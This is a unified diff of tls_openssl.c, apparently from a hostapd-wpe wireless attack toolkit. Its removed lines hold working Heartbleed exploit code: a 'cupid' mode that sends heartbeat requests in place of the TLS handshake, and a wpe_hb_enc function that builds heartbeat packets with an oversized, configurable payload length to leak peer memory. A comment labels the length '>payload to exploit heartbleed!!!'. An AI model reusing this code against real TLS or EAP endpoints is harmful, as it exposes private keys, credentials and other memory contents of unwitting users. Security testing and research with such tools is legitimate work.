@@ -1,0 +1,170 @@
+--- src/crypto/tls_openssl.c	2017-04-17 01:48:59.953563490 -0400
++++ src/crypto/tls_openssl.c	2016-10-02 14:51:11.000000000 -0400
+@@ -21,7 +21,6 @@
+ #include <openssl/opensslv.h>
+ #include <openssl/pkcs12.h>
+ #include <openssl/x509v3.h>
+-#include <openssl/rand.h>
+ #ifndef OPENSSL_NO_ENGINE
+ #include <openssl/engine.h>
+ #endif /* OPENSSL_NO_ENGINE */
+@@ -39,9 +38,6 @@
+ #include "tls.h"
+ #include "tls_openssl.h"
+ 
+-#include "wpe/wpe.h"
+-
+-
+ #if !defined(CONFIG_FIPS) &&                             \
+     (defined(EAP_FAST) || defined(EAP_FAST_DYNAMIC) ||   \
+      defined(EAP_SERVER_FAST))
+@@ -183,9 +179,6 @@
+ 
+ #endif /* ANDROID */
+ 
+-// WPE
+-int wpe_hb_enc(struct tls_connection *conn); // WPE: To limit changes up top
+-
+ static int tls_openssl_ref_count = 0;
+ static int tls_ex_idx_session = -1;
+ 
+@@ -1355,10 +1348,6 @@
+ 	conn->context = context;
+ 	SSL_set_app_data(conn->ssl, conn);
+ 	SSL_set_msg_callback(conn->ssl, tls_msg_cb);
+-	if (wpe_conf.wpe_enable_cupid) 
+-		SSL_set_msg_callback(conn->ssl, wpe_hb_cb);
+-	else
+-		SSL_set_msg_callback(conn->ssl, tls_msg_cb);
+ 	SSL_set_msg_callback_arg(conn->ssl, conn);
+ 	options = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 |
+ 		SSL_OP_SINGLE_DH_USE;
+@@ -3266,9 +3255,8 @@
+ openssl_handshake(struct tls_connection *conn, const struct wpabuf *in_data,
+ 		  int server)
+ {
+-	int res,i;
++	int res;
+ 	struct wpabuf *out_data;
+-    struct wpabuf *wpe_hb_ptr1, *wpe_hb_ptr2;
+ 
+ 	/*
+ 	 * Give TLS handshake data from the server (if available) to OpenSSL
+@@ -3328,25 +3316,6 @@
+ 	}
+ 	wpabuf_put(out_data, res);
+ 
+-    if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_before_handshake && wpe_conf.wpe_hb_num_tries) {
+-
+-        wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat request instead of handshake\n");
+-        wpe_hb_ptr1 = NULL;
+-        for (i=0; i < wpe_conf.wpe_hb_num_repeats; i++) {
+-            wpe_hb_ptr2 = wpabuf_alloc(wpe_hb_msg_len-1);
+-            memcpy(wpabuf_mhead(wpe_hb_ptr2), (u8 *)wpe_hb_clear(), wpe_hb_msg_len-1);
+-            wpabuf_put(wpe_hb_ptr2, wpe_hb_msg_len-1);
+-            if (wpe_hb_ptr1) {
+-                wpe_hb_ptr1 = wpabuf_concat(wpe_hb_ptr1,wpe_hb_ptr2);
+-            } else { 
+-                wpe_hb_ptr1 = wpe_hb_ptr2;
+-            }
+-        }
+-        conn->ssl->tlsext_hb_pending = 1;
+-        wpe_conf.wpe_hb_num_tries--;
+-        return wpe_hb_ptr1;
+-    }
+-
+ 	return out_data;
+ }
+ 
+@@ -3462,12 +3431,6 @@
+ 		tls_show_errors(MSG_INFO, __func__, "BIO_reset failed");
+ 		return NULL;
+ 	}
+-
+-    if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_before_appdata) {
+-
+-        wpe_hb_enc(conn);
+-	}
+-
+ 	res = SSL_write(conn->ssl, wpabuf_head(in_data), wpabuf_len(in_data));
+ 	if (res < 0) {
+ 		tls_show_errors(MSG_INFO, __func__,
+@@ -3475,11 +3438,6 @@
+ 		return NULL;
+ 	}
+ 
+-    if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_after_appdata) {
+-
+-        wpe_hb_enc(conn);
+-	}
+-
+ 	/* Read encrypted data to be sent to the server */
+ 	buf = wpabuf_alloc(wpabuf_len(in_data) + 300);
+ 	if (buf == NULL)
+@@ -4293,66 +4251,6 @@
+ #endif /* EAP_FAST || EAP_FAST_DYNAMIC || EAP_SERVER_FAST */
+ }
+ 
+-int wpe_hb_enc(struct tls_connection *conn) {
+-    unsigned char *cbuf, *p;
+-
+-    unsigned int real_payload = 18; //default: 18 /* Sequence number + random bytes */
+-    unsigned int padding = 16; //default: 16 /* Use minimum padding */
+-
+-    if (!SSL_is_init_finished(conn->ssl)) {
+-        return -1;
+-    }
+-
+-    if(!conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
+-            conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS) {
+-        wpa_printf(MSG_DEBUG, "[WPE] warning: heartbeat extension is unsupported (try anyway)\n");
+-    } else {
+-        wpa_printf(MSG_DEBUG,"[WPE] Heartbeat extention is supported, may not be vulnerable!\n");
+-    }
+-
+-    /* Check if padding is too long, payload and padding
+-    * must not exceed 2^14 - 3 = 16381 bytes in total.
+-    */
+-    OPENSSL_assert(real_payload + padding <= 16381);
+-
+-    cbuf = OPENSSL_malloc(1 + 2 + real_payload + padding);
+-
+-    if(cbuf==NULL)
+-        return -1;
+-
+-    p = cbuf;
+-
+-    *p++ = TLS1_HB_REQUEST;
+-
+-
+-    /* Payload length (18 bytes here) */
+-    //s2n(payload, p);  /* standards compliant payload */
+-    //s2n(payload +10, p);  /* >payload to exploit heartbleed!!! */
+-    s2n(wpe_conf.wpe_hb_payload_size, p); /* configured payload */
+-
+-    /* Sequence number */
+-    s2n(conn->ssl->tlsext_hb_seq, p);
+-    /* 16 random bytes */
+-    RAND_pseudo_bytes(p, 16);
+-    //RAND_bytes(p, 16);
+-    p += 16;
+-    /* Random padding */
+-    RAND_pseudo_bytes(p, padding);
+-    //RAND_bytes(p, padding);
+-
+-    wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat reaquesting payload size %u...\n", wpe_conf.wpe_hb_payload_size);
+-    wpa_hexdump(MSG_DEBUG, "[WPE] heartbeat packet to send:", cbuf, 1 + 2 + real_payload + padding);
+-
+-    /* Send heartbeat request */
+-    if (SSL_get_ssl_method(conn->ssl)->ssl_write_bytes(conn->ssl, TLS1_RT_HEARTBEAT,
+-    cbuf, 3 + real_payload + padding) >= 0)
+-    conn->ssl->tlsext_hb_pending = 1;
+-    OPENSSL_free(cbuf);
+-
+-    return 0;
+-}
+-
+-
+ 
+ int tls_get_library_version(char *buf, size_t buf_len)
+ {
